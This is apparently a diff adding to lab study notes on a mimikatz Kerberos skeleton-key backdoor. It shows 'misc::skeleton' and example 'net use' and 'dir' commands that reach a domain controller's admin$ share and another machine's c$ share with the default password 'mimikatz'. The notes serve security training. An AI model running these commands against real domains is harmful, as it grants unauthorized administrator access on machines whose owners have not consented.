@@ -154,3 +154,14 @@ b3f6 /id:500
 
 # Kerberos Backdoors w/ mimikatz
 - misc::skeleton - Yes! that's it but don't underestimate this small command it is very powerful
+```
+Accessing the forest - 
+
+The default credentials will be: "mimikatz"
+
+example: net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz - The share will now be accessible without the need for the Administrators password
+
+example: dir \\Desktop-1\c$ /user:Machine1 mimikatz - access the directory of Desktop-1 without ever knowing what users have access to Desktop-1
+
+The skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques however that is out of scope for this room.
+```
